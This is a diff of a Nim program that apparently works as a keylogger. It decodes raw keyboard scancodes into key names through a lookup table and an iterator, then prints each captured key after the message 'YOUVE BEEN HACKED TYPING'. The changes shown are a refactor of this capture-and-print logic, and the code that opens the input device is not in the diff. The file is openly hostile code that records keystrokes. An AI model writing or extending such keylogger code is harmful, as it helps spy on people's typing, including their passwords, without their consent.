@@ -1,43 +1,18 @@
-import std/strutils
-
-
-
-
-
-
-
-
-
-
-
 proc toString(byt: int): string =
 
     var count = 0
-    var alpha: seq[string]
-    const letters = ["esc", "0", "-", "=", "BACK_SPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CONTROL", "a", "s", 
+    const letters = ["esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACK_SPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CONTROL", "a", "s", 
                         "d", "f", "g", "h", "j", "k", "l", ";", "'", "UNKOWN", "L_SHIFT", """\""", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", 
                         "UNKNOWN", "L_ALT", "SPACE"]
-    
-    for x in 1 .. 9:
-        alpha.add($x)
-    for x in letters:
-        alpha.add(x)
 
-    for i in alpha:
+
+    for i in letters:
         if byt - 1 == count:
-            return alpha[count]
+            return letters[count]
         count = count + 1
 
 
-    
-
-
-
-
-
-
-
-proc main() =
+iterator getKey(): string =
     var data: array[8, int8]
     var longData: seq[int]
     var found = false
@@ -56,16 +31,18 @@ proc main() =
         elif longData[4] == 0:
             discard
         else:
-            echo longData[4]
-            echo toString(longData[4])
+            yield toString(longData[4])
         found = false
         longData = @[]
 
             
         
-
+proc main() =
+    for x in getKey():
+        if x == "":
+            discard
+        else:
+            echo "YOUVE BEEN HACKED TYPING ", x 
 
 
 main()
-
-
